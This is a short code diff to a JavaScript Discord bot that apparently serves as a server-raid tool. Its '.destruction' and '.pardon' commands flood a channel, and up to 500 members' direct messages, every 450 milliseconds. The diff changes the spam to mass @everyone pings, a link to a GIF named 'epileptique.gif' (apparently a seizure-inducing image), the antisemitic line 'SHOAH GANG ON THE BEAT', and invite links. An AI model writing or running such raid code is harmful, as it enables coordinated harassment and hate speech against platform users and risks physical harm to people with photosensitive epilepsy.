@@ -28,7 +28,10 @@ bot.on('message', msg => {
 if (msg.content === '.destruction') {
     console.log(`Commande .destruction par ${msg.author.tag}`);
     var interval = setInterval (function () {
-      msg.channel.send("@everyone @here Rejoin la team qui ta detruis petit facho https://discord.gg/W6WmNW8").catch(e => {});
+      msg.channel.send("@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
+        "SHOAH GANG ON THE BEAT \n"+
+        "https://discord.gg/8vtFryt \n"+
+        "https://discord.gg/s5Y2RfG").catch(e => {});
     }, 450)
   }
 
@@ -112,7 +115,10 @@ if (msg.content === '.pardon') {
 
     if(i < 500){
       var interval = setInterval (function () {
-        member.send("https://discord.gg/W6WmNW8").catch(e => {});
+        member.send("@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
+        "SHOAH GANG ON THE BEAT \n"+
+        "https://discord.gg/8vtFryt \n"+
+        "https://discord.gg/s5Y2RfG").catch(e => {});
       }, 450)
 
       }   
